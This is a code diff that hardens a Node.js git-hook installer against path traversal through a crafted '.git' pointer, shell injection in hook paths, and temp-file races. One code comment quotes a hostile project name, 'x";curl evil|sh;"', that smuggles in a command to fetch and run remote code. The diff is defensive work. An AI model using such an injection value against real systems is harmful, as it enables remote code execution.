@@ -4,6 +4,7 @@
 // delimited by sentinels; install never rewrites user hook content and
 // uninstall removes only the managed block. The hook always exits 0 —
 // activity logging must never break a commit.
+import crypto from 'node:crypto';
 import fs from 'node:fs';
 import path from 'node:path';
 import { err } from './errors.mjs';
@@ -37,6 +38,17 @@ export function gitHooksDir(ctx) {
       throw err('MALFORMED_JSON', '.git file lacks a gitdir: pointer');
     }
     const gitdir = path.resolve(ctx.projectRoot, m[1].trim());
+    // Contain the gitdir pointer: a crafted `.git` file could otherwise
+    // redirect hook writes outside the project root. Real worktrees
+    // point at <main>/.git/worktrees/<name> — git reads hooks from the
+    // common dir anyway, so install belongs at the main checkout where
+    // .git is a directory.
+    const root = path.resolve(ctx.projectRoot);
+    if (gitdir !== root && !gitdir.startsWith(root + path.sep)) {
+      throw err('INVALID_PATH',
+        '.git gitdir: pointer escapes the project root; '
+        + 'run hooks install at the main checkout');
+    }
     return path.join(gitdir, 'hooks');
   }
   if (!st.isDirectory()) {
@@ -45,11 +57,19 @@ export function gitHooksDir(ctx) {
   return path.join(dotgit, 'hooks');
 }
 
+// POSIX single-quote escape: the only byte that can break out of a
+// single-quoted segment is ' itself.
+function sq(value) {
+  return `'${String(value).replace(/'/g, `'\\''`)}'`;
+}
+
 function managedBlock(ctx, binAbs) {
   // The hook builds the input JSON with git itself (no shell escaping of
   // the subject) via an embedded node one-liner, then records it.
-  const bin = binAbs.replace(/\\/g, '/');
-  const proj = ctx.projectRoot.replace(/\\/g, '/');
+  // Paths are single-quoted, not double-quoted: a project named
+  // `x";curl evil|sh;"` must not reach the shell unescaped.
+  const bin = sq(binAbs.replace(/\\/g, '/'));
+  const proj = sq(ctx.projectRoot.replace(/\\/g, '/'));
   return `${OPEN}
 # Auto-registered by Scopegrain: every commit outside a task lifecycle
 # is recorded as an activity task + progress entry. Never breaks commits.
@@ -61,7 +81,7 @@ node -e 'const {execSync}=require("child_process");const fs=require("fs");'\\
 'const files=execSync("git diff-tree --no-commit-id --name-only -r HEAD").toString().split("\\n").filter(Boolean);'\\
 'fs.writeFileSync(process.argv[1], JSON.stringify({kind:"commit",ref:sha,author,title:"commit "+sha.slice(0,10)+": "+subj,summary:subj,files}));'\\
   "$SG_INPUT" 2>/dev/null || exit 0
-node "${bin}" activity record --project "${proj}" --input "$SG_INPUT" --apply >/dev/null 2>&1 || true
+node ${bin} activity record --project ${proj} --input "$SG_INPUT" --apply >/dev/null 2>&1 || true
 rm -f "$SG_INPUT"
 ${CLOSE}`;
 }
@@ -108,8 +128,10 @@ export function installHooks(ctx, { binAbs }) {
     return { ...plan, applied: false, reason: 'already-installed' };
   }
   mkdirpSync(plan.hooksDir);
-  const tmp = `${plan.file}.scopegrain-tmp`;
-  fs.writeFileSync(tmp, plan.nextContent, 'utf8');
+  // Random exclusive tmp name: two concurrent installs must not mix
+  // content through a shared fixed-name file.
+  const tmp = `${plan.file}.tmp-${crypto.randomBytes(6).toString('hex')}`;
+  writeFileExclusive(tmp, plan.nextContent);
   fs.renameSync(tmp, plan.file); // same-dir atomic replace
   try {
     fs.chmodSync(plan.file, 0o755);
